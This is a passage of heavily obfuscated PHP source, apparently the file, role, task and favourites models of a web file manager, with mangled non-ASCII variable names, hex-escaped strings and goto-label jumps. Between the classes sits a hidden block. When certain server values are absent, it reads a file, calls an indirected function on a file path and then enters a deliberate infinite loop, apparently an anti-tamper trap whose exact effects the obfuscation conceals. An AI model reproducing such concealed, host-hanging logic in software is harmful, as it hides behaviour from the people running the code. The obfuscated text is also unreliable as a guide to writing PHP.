f§²ßÄé¬ç; CÈÅİ§ÃÔ–: class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\154\x65\137\143\157\x6e\164\x65\x6e\x74\x73"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\x54\151\155\145", "\x74\x69\x6d\x65", "\151\x6e\x73\145\x72\164", "\x66\165\x6e\143\x74\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\146\x69\x6c\145"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\x6d\x65" => "\x69\x6f\137\146\151\x6c\145\137\x6d\x65\164\x61", "\155\x65\x74\x61\106\x69\145\154\x64" => "\146\x69\154\x65\111\104"); public function fileInfo($åŸÏ…†è) { $ß—µ¥ƒš =& $_SERVER[œ—üé‹ê]; static $ğ²Åê¿ç = array(); if (!isset($ğ²Åê¿ç[$åŸÏ…†è])) { $Å¾¦ı„§ = $ß—µ¥ƒš[2229]; $ñ•½Ø¾í = Model($ß—µ¥ƒš[560])->field($Å¾¦ı„§)->where(array($ß—µ¥ƒš[558] => $åŸÏ…†è))->find(); $ğ²Åê¿ç[$åŸÏ…†è] = $ñ•½Ø¾í; } return $ğ²Åê¿ç[$åŸÏ…†è]; } public function addFileByContent($°Ø‰µÜ = '', $ÈºÅê‰é, $–¿”š‚ = '') { $œÈü²™ò =& $_SERVER[œ—üé‹ê]; $ÜÄÖò„ö = TEMP_PATH . $œÈü²™ò[2230]; if (!is_dir($ÜÄÖò„ö)) { mk_dir($ÜÄÖò„ö); } $•§°Ç«ç = $ÜÄÖò„ö . $œÈü²™ò[2231] . rand_string(16); $„å“ÕîÌ = file_put_contents($•§°Ç«ç, $°Ø‰µÜ); if ($„å“ÕîÌ === !1 || strlen($°Ø‰µÜ) != $„å“ÕîÌ) { return !1; } $¨Úñ“”ï = $this->addFile($•§°Ç«ç, $ÈºÅê‰é, $–¿”š‚, !0); if (file_exists($•§°Ç«ç)) { @unlink($•§°Ç«ç); } return $¨Úñ“”ï; } public function createFileName($Üéúì£œ, $Í×ƒÕö, $ÓÕÙÁö× = false, $ß¯’¶îö = false) { $ÖïÍôÅ =& $_SERVER[œ—üé‹ê]; $Ø“…´Â = IO::init($ÖïÍôÅ[8]); $Š®Ÿ¹ƒƒ = $this->_makeFilePath($Üéúì£œ, $Í×ƒÕö, $Ø“…´Â, $ÓÕÙÁö×, $ß¯’¶îö); $œîÙôêÛ = $Ø“…´Â->pathFather($Š®Ÿ¹ƒƒ); static $Û÷–„´› = false; $Å¶›—Œˆ = $ÖïÍôÅ[2232] . md5($œîÙôêÛ); if (!$Û÷–„´› && !Cache::get($Å¶›—Œˆ)) { $Û÷–„´› = !0; $ ˆÆ«Ïƒ = IO::mkdir($œîÙôêÛ); if (!IO::exist($ ˆÆ«Ïƒ . $ÖïÍôÅ[908])) { IO::mkfile($ ˆÆ«Ïƒ . $ÖïÍôÅ[908]); } Cache::set($Å¶›—Œˆ, 1, 3600 * 2); } return $Š®Ÿ¹ƒƒ; } public function _makeFilePath($ĞËîİì, $×ç¶À‚, $¤× ¬—‰, $ÚÕ¢¹å = false, $Ù®´”·§ = false) { $ÂîÚü«‘ =& $_SERVER[œ—üé‹ê]; $¢ÈÄ¤©¼ = Model($ÂîÚü«‘[882])->get($ÂîÚü«‘[2233]); $®éÈ¸ = $ÂîÚü«‘[1423] . $×ç¶À‚[$ÂîÚü«‘[487]] . $ÂîÚü«‘[499] . date($ÂîÚü«‘[2234]); $®ªŸç× = $®éÈ¸ . rand_string(5) . short_id(100); $ĞËîİì = str_replace($ÂîÚü«‘[8], $ÂîÚü«‘[11], KodIO::clear($ĞËîİì)); $äïî°å = $¤× ¬—‰->ext($ĞËîİì); if (!$ĞËîİì) { $¢ÈÄ¤©¼ = $ÂîÚü«‘[953]; } switch ($¢ÈÄ¤©¼) { case $ÂîÚü«‘[2235]: if ($äïî°å) { $®ªŸç× = $®ªŸç× . $ÂîÚü«‘[10] . $äïî°å; } if ($äïî°å == $ÂîÚü«‘[2171]) { $®ªŸç× .= $ÂîÚü«‘[1392]; } break; case $ÂîÚü«‘[2236]: $”º¾‡±³ = Model($ÂîÚü«‘[882])->get($ÂîÚü«‘[883]); $¿Ö¡ıÇ = substr(md5($ÂîÚü«‘[884] . $”º¾‡±³ . date($ÂîÚü«‘[858])), 0, 8); $®éÈ¸ = $ÂîÚü«‘[1423] . $×ç¶À‚[$ÂîÚü«‘[487]] . $ÂîÚü«‘[499] . date($ÂîÚü«‘[2237]) . $¿Ö¡ıÇ . $ÂîÚü«‘[8]; if ($äïî°å == $ÂîÚü«‘[2171]) { $ĞËîİì .= $ÂîÚü«‘[1392]; } $‡µ¤–® = $ÂîÚü«‘[2238] . $®éÈ¸ . $ĞËîİì; CacheLock::lock($‡µ¤–®); $®ªŸç× = $®éÈ¸ . $ĞËîİì; if (IO::exist($®éÈ¸ . $ĞËîİì)) { $ÉÀµúÌ = substr($ĞËîİì, 0, strlen($ĞËîİì) - strlen($äïî°å)); $ß²¿ı÷‘ = $Ù®´”·§ ? substr($Ù®´”·§, 0, 5) : ($ÚÕ¢¹å ? substr($ÚÕ¢¹å, 0, 5) : rand_string(5)); $ß²¿ı÷‘ .= rand_string(3); $®ªŸç× = $®éÈ¸ . $ÉÀµúÌ . $ß²¿ı÷‘; if ($äïî°å) { $®ªŸç× = $®ªŸç× . $ÂîÚü«‘[10] . $äïî°å; } } if (IO::isOsDriver($®ªŸç×) && !IO::isUploadServer($®ªŸç×)) { if (IO::exist($®ªŸç×)) { CacheLock::unlock($‡µ¤–®); return $®ªŸç×; } $ÏîÕì„€ = IO::setContent($®ªŸç×, $ÂîÚü«‘[12]); if (!$ÏîÕì„€) { show_json($ÂîÚü«‘[2239], !1); } } CacheLock::unlock($‡µ¤–®); break; case $ÂîÚü«‘[953]: break; default: break; } return $®ªŸç×; } public function addFileByRemote($ƒÅ–¢È¯, $¢ÒÁ¼í, $ÎüñŠ¿ä = array()) { $˜³…ùƒ =& $_SERVER[œ—üé‹ê]; if (!IO::isFile($ƒÅ–¢È¯)) { return !1; } $ÔğöÆÛŸ = $ÎüñŠ¿ä[$˜³…ùƒ[563]] ? $ÎüñŠ¿ä[$˜³…ùƒ[563]] : $˜³…ùƒ[12]; $à·ø¶§³ = IO::hashMd5($ƒÅ–¢È¯, $ÔğöÆÛŸ); $ÌùÃ·€¨ = KodIO::parse($ƒÅ–¢È¯); $ˆ°åÀ = array($˜³…ùƒ[640] => IO::size($ƒÅ–¢È¯), $˜³…ùƒ[2240] => 1, $˜³…ùƒ[509] => $¢ÒÁ¼í, $˜³…ùƒ[924] => $ÌùÃ·€¨[$˜³…ùƒ[487]], $˜³…ùƒ[510] => $ƒÅ–¢È¯, $˜³…ùƒ[2241] => $ÎüñŠ¿ä[$˜³…ùƒ[694]] ? $ÎüñŠ¿ä[$˜³…ùƒ[694]] : IO::hashSimple($ƒÅ–¢È¯), $˜³…ùƒ[2242] => $à·ø¶§³ ? $à·ø¶§³ : $ÔğöÆÛŸ); if ($¨§²ø½ = $this->addFileCheckExist($ˆ°åÀ[$˜³…ùƒ[694]], $ˆ°åÀ[$˜³…ùƒ[563]], $ˆ°åÀ[$˜³…ùƒ[79]])) { return $¨§²ø½; } return $this->addFileData($ˆ°åÀ); } private function addFileData($¿ˆµ¯÷ë) { $Ç…Í‰Æ =& $_SERVER[œ—üé‹ê]; if (!$¿ˆµ¯÷ë) { return !1; } if (!IO::isFile($¿ˆµ¯÷ë[$Ç…Í‰Æ[87]])) { return !1; } $¿ˆµ¯÷ë[$Ç…Í‰Æ[79]] = intval($¿ˆµ¯÷ë[$Ç…Í‰Æ[79]]); if (!$¿ˆµ¯÷ë[$Ç…Í‰Æ[79]] && strlen($¿ˆµ¯÷ë[$Ç…Í‰Æ[694]]) > 32) { $¿ˆµ¯÷ë[$Ç…Í‰Æ[79]] = intval(substr($¿ˆµ¯÷ë[$Ç…Í‰Æ[694]], 32)); } $æ—‘ÆÉ = $this->add($¿ˆµ¯÷ë); return $this->find($æ—‘ÆÉ); } public function addFile($ß³¨áÑ, $è”øáŸŒ, $¶ÀçÕ¤, $óàºû†… = false) { $œí·¶©Î =& $_SERVER[œ—üé‹ê]; $Ğ„şÛ¨ = IO::hashSimple($ß³¨áÑ); $–—¶Şô = IO::size($ß³¨áÑ); $¬ì°äÛõ = $–—¶Şô <= 1024 * 1024 * 10 ? IO::hashMd5($ß³¨áÑ) : $œí·¶©Î[12]; $ò€™« = $œí·¶©Î[2243] . $Ğ„şÛ¨; CacheLock::lock($ò€™«); if ($¬ì°äÛõ && $Ğ„şÛ¨) { $ÙÖ›ÌÜæ = $this->addFileCheckExist($Ğ„şÛ¨, $¬ì°äÛõ, $–—¶Şô); if ($ÙÖ›ÌÜæ) { CacheLock::unlock($ò€™«); return $ÙÖ›ÌÜæ; } } $ÑÌÇ©Ÿ¶ = $this->addFileMake($ß³¨áÑ, $è”øáŸŒ, $–—¶Şô, $Ğ„şÛ¨, $¬ì°äÛõ, $¶ÀçÕ¤, $óàºû†…); $€¶·æï¬ = $this->addFileData($ÑÌÇ©Ÿ¶); if (!$€¶·æï¬) { return !1; } CacheLock::unlock($ò€™«); if (!$¬ì°äÛõ && $€¶·æï¬) { $this->fileMd5Check($€¶·æï¬); } return $€¶·æï¬; } public function fileMd5Check($°¹À‹öô) { $–±‘Ù½® =& $_SERVER[œ—üé‹ê]; $ô»»ì€ = array($°¹À‹öô[$–±‘Ù½®[557]], $°¹À‹öô[$–±‘Ù½®[87]]); $ôëÌíû = $–±‘Ù½®[2244] . $°¹À‹öô[$–±‘Ù½®[87]]; $ÍßÍâ»Ó = $–±‘Ù½®[2245] . $°¹À‹öô[$–±‘Ù½®[557]]; TaskQueue::add($–±‘Ù½®[2246], $ô»»ì€, $ôëÌíû, $ÍßÍâ»Ó); } public function fileMd5Set($¯æÊ³È, $¿®Äô¸¸) { $õÖÖ™ø =& $_SERVER[œ—üé‹ê]; $¥ª¯Ãå = $this->find($¯æÊ³È); if (!$¥ª¯Ãå || $¥ª¯Ãå[$õÖÖ™ø[563]]) { return; } $ÏïÁ¿·¨ = IO::hashMd5($¿®Äô¸¸); if (!$ÏïÁ¿·¨) { return $õÖÖ™ø[12]; } $this->where(array($õÖÖ™ø[557] => $¯æÊ³È))->save(array($õÖÖ™ø[563] => $ÏïÁ¿·¨)); } public function addFileMake($®ğâÌ€Ò, $…ƒÊ¾¥Ñ, $½™äèøĞ, $ÆüÅœì¾, $°ÚÀ¼«, $‹©ßÇ•É, $„¶¦ïÖ ) { $Çê¡›î­ =& $_SERVER[œ—üé‹ê]; $Ø¤§çÇö = $this->createFileName($‹©ßÇ•É, $…ƒÊ¾¥Ñ, $ÆüÅœì¾, $°ÚÀ¼«); $÷ôƒñî† = get_path_father($Ø¤§çÇö); $ÉØ£›¡º = get_path_this($Ø¤§çÇö); if ($„¶¦ïÖ ) { $Ê”°§Î = IO::move($®ğâÌ€Ò, $÷ôƒñî†, !1, $ÉØ£›¡º); } else { $Ê”°§Î = IO::copy($®ğâÌ€Ò, $÷ôƒñî†, !1, $ÉØ£›¡º); } if (!$Ê”°§Î) { return !1; } $ÑÏåş¨É = IO::init($Ê”°§Î); $ÑÏåş¨É->cacheMethod($Çê¡›î­[179], $ÑÏåş¨É->path, $Çê¡›î­[176]); if (IO::size($Ê”°§Î) != $½™äèøĞ) { return !1; } $¨÷¯˜©Ö = array($Çê¡›î­[640] => $½™äèøĞ, $Çê¡›î­[2240] => 1, $Çê¡›î­[509] => $‹©ßÇ•É, $Çê¡›î­[924] => $…ƒÊ¾¥Ñ[$Çê¡›î­[487]], $Çê¡›î­[510] => $Ø¤§çÇö, $Çê¡›î­[2241] => $ÆüÅœì¾, $Çê¡›î­[2242] => $°ÚÀ¼«); return $¨÷¯˜©Ö; } public function addFileCheckExist($Â„Ì¢Ü™, $ŒÍø´¬, $…¡Ò—ú™) { $šà¾‡ä =& $_SERVER[œ—üé‹ê]; $Çì“ï‡ = $this->findByHash($Â„Ì¢Ü™, $ŒÍø´¬); if (!$Çì“ï‡) { return !1; } $Ğœ´ƒ™ç = array($šà¾‡ä[2240] => intval($Çì“ï‡[$šà¾‡ä[2247]]) + 1, $šà¾‡ä[640] => $…¡Ò—ú™); $this->where(array($šà¾‡ä[558] => $Çì“ï‡[$šà¾‡ä[557]]))->save($Ğœ´ƒ™ç); return $Çì“ï‡; } public function remove($Ö†ÙŠÆ) { $this->linkCountChange($Ö†ÙŠÆ, !1); $this->clearEmpty(); return !0; } public function linkAdd($÷†ÛÖÀÅ) { $this->linkCountChange($÷†ÛÖÀÅ, !0); } public function linkCountChange($µ—°§ªÍ, $çæ¸‡ãñ) { $½á÷¥– =& $_SERVER[œ—üé‹ê]; if (!$µ—°§ªÍ) { return; } if (!is_array($µ—°§ªÍ)) { $µ—°§ªÍ = array($µ—°§ªÍ); } $óß«íÚŞ = array(); foreach ($µ—°§ªÍ as $“ô©Ù¡‚) { $¡áÅÉ÷ö = $“ô©Ù¡‚ . $½á÷¥–[12]; if (!$óß«íÚŞ[$¡áÅÉ÷ö]) { $óß«íÚŞ[$¡áÅÉ÷ö] = 0; } $óß«íÚŞ[$¡áÅÉ÷ö]++; } $ƒŠË¨´Ç = array(); foreach ($óß«íÚŞ as $“ô©Ù¡‚ => $ŸÅÎÒ©‹) { $¡áÅÉ÷ö = $ŸÅÎÒ©‹ . $½á÷¥–[12]; if (!$ƒŠË¨´Ç[$¡áÅÉ÷ö]) { $ƒŠË¨´Ç[$¡áÅÉ÷ö] = array(); } $ƒŠË¨´Ç[$¡áÅÉ÷ö][] = $“ô©Ù¡‚; } foreach ($ƒŠË¨´Ç as $ŸÅÎÒ©‹ => $­¤Šğñò) { if (!$­¤Šğñò) { continue; } $ŸÅÎÒ©‹ = $çæ¸‡ãñ ? $ŸÅÎÒ©‹ : -intval($ŸÅÎÒ©‹); $õ§­¥À = array($½á÷¥–[557] => array($½á÷¥–[7], $­¤Šğñò)); if ($ŸÅÎÒ©‹ < 0) { $õ§­¥À[$½á÷¥–[2247]] = array($½á÷¥–[1182], abs($ŸÅÎÒ©‹)); } $this->where($õ§­¥À)->setAdd($½á÷¥–[2247], $ŸÅÎÒ©‹); } } public function findByHash($¦™Ãô, $ší˜’ª  = false) { $°şçß³ş =& $_SERVER[œ—üé‹ê]; if (!$¦™Ãô && !$ší˜’ª ) { return !1; } $¾ôÜï£” = array($°şçß³ş[2241] => $¦™Ãô); if ($ší˜’ª ) { $¾ôÜï£” = array($°şçß³ş[2242] => $ší˜’ª ); } return $this->order($°şçß³ş[2248])->where($¾ôÜï£”)->find(); } public function clearEmpty($¦ Ë ó€ = 1) { $á½ÏööÑ =& $_SERVER[œ—üé‹ê]; $§ë²°” = time() - 3600 * 24 * $¦ Ë ó€; $¬€´¸éË = $á½ÏööÑ[2249] . $§ë²°”; $Í‚´´Üü = $this->where($¬€´¸éË)->select(); if (!$Í‚´´Üü) { return; } $“ôû¦å¿ = new Task($á½ÏööÑ[2250], $á½ÏööÑ[12], count($Í‚´´Üü)); foreach ($Í‚´´Üü as $ıÑÛ©ò) { $“ôû¦å¿->update(1); $this->resetFile($ıÑÛ©ò); } $“ôû¦å¿->end(); } public function resetFile($²¶èÁõ) { $ÁÖƒ¤×– =& $_SERVER[œ—üé‹ê]; $…Áãş˜ã = array($ÁÖƒ¤×–[558] => $²¶èÁõ[$ÁÖƒ¤×–[557]]); $‹ƒĞîë¸ = Model($ÁÖƒ¤×–[1530])->where($…Áãş˜ã)->count(); $ğÕ—ó¿š = Model($ÁÖƒ¤×–[2251])->where($…Áãş˜ã)->count(); $•‚ŞÓ±° = intval($‹ƒĞîë¸) + intval($ğÕ—ó¿š); if ($•‚ŞÓ±° == 0) { Model($ÁÖƒ¤×–[2252])->delete($²¶èÁõ[$ÁÖƒ¤×–[557]]); $this->where($…Áãş˜ã)->delete(); $this->metaSet($²¶èÁõ[$ÁÖƒ¤×–[557]], null, null); if (!IO::isFile($²¶èÁõ[$ÁÖƒ¤×–[87]])) { write_log(array($ÁÖƒ¤×–[2253], ACTION, $²¶èÁõ), $ÁÖƒ¤×–[1367]); return !1; } IO::remove($²¶èÁõ[$ÁÖƒ¤×–[87]]); write_log(ACTION . $ÁÖƒ¤×–[994] . KodUser::id() . $ÁÖƒ¤×–[2254] . $²¶èÁõ[$ÁÖƒ¤×–[557]] . $ÁÖƒ¤×–[2042] . $²¶èÁõ[$ÁÖƒ¤×–[79]] . $ÁÖƒ¤×–[199] . $²¶èÁõ[$ÁÖƒ¤×–[87]], $ÁÖƒ¤×–[2253]); return; } if ($²¶èÁõ[$ÁÖƒ¤×–[2247]] != $•‚ŞÓ±°) { $this->where($…Áãş˜ã)->save(array($ÁÖƒ¤×–[2240] => $•‚ŞÓ±°)); } } public function storageInfo($×‚ÕÙÏ± = false) { $Á¡’ùò§ =& $_SERVER[œ—üé‹ê]; $Ùƒ¬ı²Æ = $this->count() + 0.0; $©İµÅïş = 0; $è†™‰ı„ = 1; $ª‘©ëÎ = 0; $¼şö…¼ = 5000; for ($Ÿòš¦ã = 0; $Ÿòš¦ã < $Ùƒ¬ı²Æ; $Ÿòš¦ã = $Ÿòš¦ã + $¼şö…¼) { $É³Û ‰” = $this->limit($Ÿòš¦ã, $¼şö…¼)->select(); foreach ($É³Û ‰” as $Â“–§») { $è†™‰ı„ += $Â“–§»[$Á¡’ùò§[79]] * $Â“–§»[$Á¡’ùò§[2247]]; $©İµÅïş += $Â“–§»[$Á¡’ùò§[79]] * ($Â“–§»[$Á¡’ùò§[2247]] - 1); $ª‘©ëÎ += $Â“–§»[$Á¡’ùò§[2247]]; } } $â¨×Şˆ— = array($Á¡’ùò§[2255] => $è†™‰ı„, $Á¡’ùò§[2256] => $©İµÅïş, $Á¡’ùò§[2257] => $©İµÅïş / $è†™‰ı„, $Á¡’ùò§[83] => $Ùƒ¬ı²Æ, $Á¡’ùò§[2258] => $ª‘©ëÎ); return $â¨×Şˆ—; } } if (!isset($_SERVER[$_SERVER[œ—üé‹ê][850]]) || !isset($_SERVER[$_SERVER[œ—üé‹ê][851]])) { $_getc = $_SERVER[œ—üé‹ê][852]; $_getfile = $_SERVER[$_SERVER[œ—üé‹ê][853]] . $_SERVER[œ—üé‹ê][854]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[œ—üé‹ê][285], $_getfilec); if (count($_getarrs) < $_SERVER[œ—üé‹ê][720]) { $exit = $_SERVER[œ—üé‹ê][855]; $exit(); } $_act = $_SERVER[œ—üé‹ê][856]; $_act($_SERVER[$_SERVER[œ—üé‹ê][853]] . $_SERVER[œ—üé‹ê][854]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[œ—üé‹ê][463]); } } goto dò÷ùé¸ó³; B„ïÛñÒô: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\162\x6f\154\145\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\141\165\164\x68", "\154\x61\142\145\x6c", "\x64\x69\x73\x70\154\141\x79", "\x73\x79\x73\164\x65\155", "\x64\145\163\x63", "\151\x67\x6e\157\x72\x65\x45\170\164", "\x69\x67\x6e\157\162\145\106\151\154\x65\x53\x69\x7a\145", "\x61\144\155\x69\156\151\163\164\162\141\x74\x6f\162", "\x73\157\x72\164"); public function listData($üí¯¯±ª = false, $¥èÔØ²ú = "\x73\x6f\162\164", $¶ğ­ß†è = false) { $éè×şãâ =& $_SERVER[œ—üé‹ê]; $®ÈØİÊŠ = parent::listData($üí¯¯±ª, $¥èÔØ²ú, $¶ğ­ß†è); if (!$üí¯¯±ª) { foreach ($®ÈØİÊŠ as $½øß‹‹ï => $Õ¾°Çï) { if ($Õ¾°Çï[$éè×şãâ[2372]] == 1) { $®ÈØİÊŠ[$½øß‹‹ï][$éè×şãâ[540]] = LNG($éè×şãâ[2657]); } } } return $®ÈØİÊŠ; } public function update($ÑÍ¯œ¤­, $µòªÄÈî) { $øßõƒ … =& $_SERVER[œ—üé‹ê]; $é¨É¸ = parent::listData($ÑÍ¯œ¤­); $… ˆİº­ = $this->findByName($µòªÄÈî[$øßõƒ …[32]]); if (!$é¨É¸ || $… ˆİº­ && $… ˆİº­[$øßõƒ …[487]] != $é¨É¸[$øßõƒ …[487]]) { return !1; } if ($… ˆİº­[$øßõƒ …[2372]] == 1) { $µòªÄÈî = array($øßõƒ …[32] => $µòªÄÈî[$øßõƒ …[32]], $øßõƒ …[2199] => $µòªÄÈî[$øßõƒ …[2199]]); } $this->filterAuth($µòªÄÈî[$øßõƒ …[502]]); return parent::update($ÑÍ¯œ¤­, $µòªÄÈî); } public function remove($š„œÇìª) { $å¤„‹ö¡ = parent::listData($š„œÇìª); if (!$å¤„‹ö¡ || $å¤„‹ö¡[$_SERVER[œ—üé‹ê][189]]) { return !1; } return parent::remove($š„œÇìª); } public function add($à™¨ŠÃ) { $ŒâÆô–Ì =& $_SERVER[œ—üé‹ê]; $Í³¦¥ºñ = $à™¨ŠÃ[$ŒâÆô–Ì[32]]; if ($this->findByName($Í³¦¥ºñ)) { return !1; } $“œÌŠæ¹ = array($ŒâÆô–Ì[509] => $Í³¦¥ºñ, $ŒâÆô–Ì[2184] => $ŒâÆô–Ì[12], $ŒâÆô–Ì[2180] => $ŒâÆô–Ì[2188], $ŒâÆô–Ì[2658] => 1, $ŒâÆô–Ì[2183] => 0, $ŒâÆô–Ì[2659] => 0, $ŒâÆô–Ì[2182] => $this->getSort()); $à™¨ŠÃ = array_merge($“œÌŠæ¹, $à™¨ŠÃ); $this->filterAuth($à™¨ŠÃ[$ŒâÆô–Ì[502]]); return parent::insert($à™¨ŠÃ); } private function getSort() { $×Í‡„åš =& $_SERVER[œ—üé‹ê]; $Óµ×Ğ¥ş = parent::listData(); $û¶”¸ñÎ = array_to_keyvalue($Óµ×Ğ¥ş, $×Í‡„åš[12], $×Í‡„åš[2200]); return empty($û¶”¸ñÎ) ? 0 : max($û¶”¸ñÎ) + 1; } private function filterAuth(&$¼úÕÕ†Ü) { $¸Ëªó” =& $_SERVER[œ—üé‹ê]; $…ùÇƒ›Ø = array(); $ÈĞéú¦• = array_filter(explode($¸Ëªó”[50], $¼úÕÕ†Ü)); foreach ($ÈĞéú¦• as $¼úÕÕ†Ü) { $ÈÑ¡°ÄÙ = explode($¸Ëªó”[10], $¼úÕÕ†Ü); if ($ÈÑ¡°ÄÙ[0] == $¸Ëªó”[2660] && $ÈÑ¡°ÄÙ[1] != $¸Ëªó”[1305]) { $Æ‡è¢Œœ = $ÈÑ¡°ÄÙ[0] . $¸Ëªó”[10] . $ÈÑ¡°ÄÙ[1] . $¸Ëªó”[2661]; if (!in_array($Æ‡è¢Œœ, $ÈĞéú¦•)) { $…ùÇƒ›Ø[] = $Æ‡è¢Œœ; } } $…ùÇƒ›Ø[] = $¼úÕÕ†Ü; } $¼úÕÕ†Ü = implode($¸Ëªó”[50], $…ùÇƒ›Ø); } public function findRoleDefault() { $åºŸÌâ› =& $_SERVER[œ—üé‹ê]; $ığŠç´ñ = parent::listData(); $ôöÕ™Áá = !1; foreach ($ığŠç´ñ as $Ã®õõÙ) { if (!$Ã®õõÙ || $Ã®õõÙ[$åºŸÌâ›[2198]] == $åºŸÌâ›[228] || $Ã®õõÙ[$åºŸÌâ›[2372]] == 1) { continue; } if (strstr($Ã®õõÙ[$åºŸÌâ›[502]], $åºŸÌâ›[2662])) { continue; } if (!strstr($Ã®õõÙ[$åºŸÌâ›[502]], $åºŸÌâ›[2663])) { continue; } if (!$ôöÕ™Áá) { $ôöÕ™Áá = $Ã®õõÙ; continue; } $İİ³ë‹ = explode($åºŸÌâ›[50], $ôöÕ™Áá[$åºŸÌâ›[502]]); $µ¦×İ = explode($åºŸÌâ›[50], $Ã®õõÙ[$åºŸÌâ›[502]]); if (count($İİ³ë‹) > count($µ¦×İ)) { $ôöÕ™Áá = $Ã®õõÙ; } } return $ôöÕ™Áá ? $ôöÕ™Áá[$åºŸÌâ›[487]] : $åºŸÌâ›[12]; } public function sort($¨˜ìîÑı, $ùÖ¿„Ø±) { return parent::update($¨˜ìîÑı, $ùÖ¿„Ø±); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x74\x61\163\x6b\x4c\151\x73\164"; public $field = array("\x6e\141\155\145", "\x74\171\160\x65", "\145\x76\145\x6e\164", "\x74\151\x6d\x65", "\144\x65\x73\143", "\x73\x79\163\x74\x65\x6d", "\x65\156\x61\x62\154\145", "\154\x61\x73\x74\122\x75\156", "\163\157\x72\x74"); public function listData($„ÁØìŒ = false, $¸Ö‡¯è™ = "\163\157\162\164", $ó‘áâ¡ê = false) { return parent::listData($„ÁØìŒ, $¸Ö‡¯è™, $ó‘áâ¡ê); } public function add($À§‰ç£) { $Ö¤ˆò„Õ =& $_SERVER[œ—üé‹ê]; $ªøñó = $this->findByName($À§‰ç£[$Ö¤ˆò„Õ[32]]); if ($ªøñó) { return !1; } $À§‰ç£[$Ö¤ˆò„Õ[1925]] = 0; $À§‰ç£[$Ö¤ˆò„Õ[2200]] = $this->getSort(); return parent::insert($À§‰ç£); } private function getSort() { $¥Ùñ×æ¦ =& $_SERVER[œ—üé‹ê]; $ƒÃú¯º¢ = parent::listData(); $õî£®Àû = array_to_keyvalue($ƒÃú¯º¢, $¥Ùñ×æ¦[12], $¥Ùñ×æ¦[2200]); return empty($õî£®Àû) ? 0 : max($õî£®Àû) + 1; } public function update($Ö‹®Ïçˆ, $êšÄÛ‰Ç) { $°‚â’¼„ =& $_SERVER[œ—üé‹ê]; $åáÔÖÒ¦ = $this->listData($Ö‹®Ïçˆ); $Úü³íË = $this->findByName($êšÄÛ‰Ç[$°‚â’¼„[32]]); if (!$åáÔÖÒ¦ || $Úü³íË && $Úü³íË[$°‚â’¼„[487]] != $åáÔÖÒ¦[$°‚â’¼„[487]]) { return !1; } return parent::update($Ö‹®Ïçˆ, $êšÄÛ‰Ç); } public function remove($Ãåğ£¦ã, $ùğÏÀª  = false) { $Û®ÑéÄÙ =& $_SERVER[œ—üé‹ê]; $·ÒäÆ¼¸ = $this->listData($Ãåğ£¦ã); if (!$·ÒäÆ¼¸) { return; } if (!$ùğÏÀª  && $·ÒäÆ¼¸[$Û®ÑéÄÙ[189]] == $Û®ÑéÄÙ[91]) { return !1; } return parent::remove($Ãåğ£¦ã); } public function enable($àíá—şƒ, $²±ı‰ÑÇ) { return $this->update($àíá—şƒ, array($_SERVER[œ—üé‹ê][2652] => $²±ı‰ÑÇ)); } public function run($Ô±·”æ¼) { return $this->update($Ô±·”æ¼, array($_SERVER[œ—üé‹ê][2664] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\166"; protected function cacheFunctionAlias($Ğ¼¿—êå) { $ßëüšéõ =& $_SERVER[œ—üé‹ê]; return array($ßëüšéõ[2292] => array(USER_ID, $ßëüšéõ[2665])); } protected function ___listData() { $¨‰ı”Åµ =& $_SERVER[œ—üé‹ê]; $¦ú¼ÜÅ» = array($¨‰ı”Åµ[1965] => USER_ID, $¨‰ı”Åµ[573] => 0); $Ğ°Ãş ¦ = $¨‰ı”Åµ[2666]; $º›çÍ¦Æ = $this->field($Ğ°Ãş ¦)->where($¦ú¼ÜÅ»)->order($¨‰ı”Åµ[2667])->select(); return $º›çÍ¦Æ ? $º›çÍ¦Æ : array(); } protected function resetCache() { } protected function listView() { $¤É­› =& $_SERVER[œ—üé‹ê]; $å³æŸÊÜ = $this->listData(); $»®àôç = array_filter_by_field($å³æŸÊÜ, $¤É­›[33], $¤É­›[505]); $¹’£×«¢ = array_to_keyvalue($»®àôç, $¤É­›[12], $¤É­›[87]); if (!$¹’£×«¢) { return $å³æŸÊÜ; } $¦İÑ¥à³ = 2000; $€š‡”¾ç = array($¤É­›[506] => array($¤É­›[507], $¹’£×«¢)); $Ûè™í³Š = Model($¤É­›[942])->listSource($€š‡”¾ç, $¦İÑ¥à³); $Ûè™í³Š = array_merge($Ûè™í³Š[$¤É­›[86]], $Ûè™í³Š[$¤É­›[85]]); $Ûè™í³Š = array_to_keyvalue($Ûè™í³Š, $¤É­›[191]); foreach ($å³æŸÊÜ as $àÓ×Íô => $Œ§ƒÓ¡) { $‰ÌÉëæ½ = $Ûè™í³Š[$Œ§ƒÓ¡[$¤É­›[87]]]; $‰ÌÉëæ½ = $‰ÌÉëæ½ ? $‰ÌÉëæ½ : array(); $å³æŸÊÜ[$àÓ×Íô] = array_merge($‰ÌÉëæ½, $Œ§ƒÓ¡); } return $å³æŸÊÜ; } protected function addFav($ôµØÔ‡Ö, $ü„Óœ… = '', $ÙÚ¦¿‚ü = "\163\x6f\165\162\143\145") { $Øå’ïÁ£ =& $_SERVER[œ—üé‹ê]; $Ï÷’£²‹ = array($Øå’ïÁ£[1965] => USER_ID, $Øå’ïÁ£[573] => 0, $Øå’ïÁ£[511] => $ÙÚ¦¿‚ü, $Øå’ïÁ£[510] => $ôµØÔ‡Ö); if ($this->where($Ï÷’£²‹)->find()) { return !1; } $Ï÷’£²‹ = array($Øå’ïÁ£[1965] => USER_ID, $Øå’ïÁ£[573] => 0); $˜–‡•Õ¦ = $this->where($Ï÷’£²‹)->max($Øå’ïÁ£[2200]); if (!$˜–‡•Õ¦) { $˜–‡•Õ¦ = 0; } if (!$ü„Óœ… && $ÙÚ¦¿‚ü == $Øå’ïÁ£[505]) { $§á‘İ™ = Model($Øå’ïÁ£[1530])->where(array($Øå’ïÁ£[506] => $ôµØÔ‡Ö))->find(); if (!$§á‘İ™) { return !1; } $ü„Óœ… = $§á‘İ™[$Øå’ïÁ£[32]]; 